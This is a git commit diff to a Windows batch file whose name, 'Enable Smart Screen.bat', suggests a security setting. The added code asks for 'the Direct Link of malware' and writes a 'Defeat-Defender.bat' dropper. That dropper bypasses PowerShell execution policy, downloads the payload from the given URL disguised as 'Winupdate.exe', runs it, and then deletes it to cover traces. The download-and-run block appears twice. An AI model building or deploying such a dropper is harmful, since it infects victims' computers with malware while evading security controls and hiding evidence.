94076b6c2a83be1e58500b3cf539968f9f7dcf3b
skiddo <30941141+coolst3r@users.noreply.github.com>
2023-01-05 22:51:45 +0000

    Update Enable Smart Screen.bat

--- Enable Smart Screen.bat
+++ Enable Smart Screen.bat
@@ -24,6 +24,33 @@ echo mkdir %temp%\temp_folder >>Defeat-Defender.bat
 echo powershell -command "Set-ExecutionPolicy Bypass" >>Defeat-Defender.bat
 echo powershell -command "Invoke-WebRequest -Uri %a% -OutFile %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
 echo powershell -command "start %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
+
+@echo off
+
+setlocal enabledelayedexpansion
+
+set /p a="Enter the Direct Link of malware : "
+
+if [%a%]==[] ( 
+CALL:error
+pause
+EXIT /B %ERRORLEVEL% 
+) 
+
+if [%a%] NEQ [] (
+CALL:main
+pause
+EXIT /B %ERRORLEVEL% 
+)
+
+:main
+echo.
+echo Your  Url is :  %a% 
+echo. >>Defeat-Defender.bat
+echo mkdir %temp%\temp_folder >>Defeat-Defender.bat
+echo powershell -command "Set-ExecutionPolicy Bypass" >>Defeat-Defender.bat
+echo powershell -command "Invoke-WebRequest -Uri %a% -OutFile %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
+echo powershell -command "start %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
 echo timeout 4 >>Defeat-Defender.bat
 echo powershell -command "del %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
 echo powershell -command "rmdir %temp%\temp_folder" >>Defeat-Defender.bat
